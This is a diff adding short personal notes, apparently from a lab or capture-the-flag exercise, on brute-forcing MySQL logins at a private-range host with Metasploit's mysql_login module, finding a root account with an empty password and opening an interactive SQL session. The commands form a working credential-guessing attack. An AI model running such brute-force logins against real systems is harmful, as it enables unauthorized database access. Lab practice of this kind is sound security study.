@@ -1,0 +1,29 @@
+# sql is running 3306 we can enumberate the login details using metasploit framework
+
+search mysql_login
+
+set RHOSTS 192.168.56.3
+
+set USER_FILE user.txt
+
+set PASS_File pass.txt
+
+set Verbose false
+
+run
+
+# after running this i got credentials as "root:" 
+
+# so use the same module but change the credentials as root and password as null
+
+set CreateSession true
+
+# the about cmd will create a session.
+
+run
+
+we get sql session
+
+to run sql commands run 
+
+query_interactive 
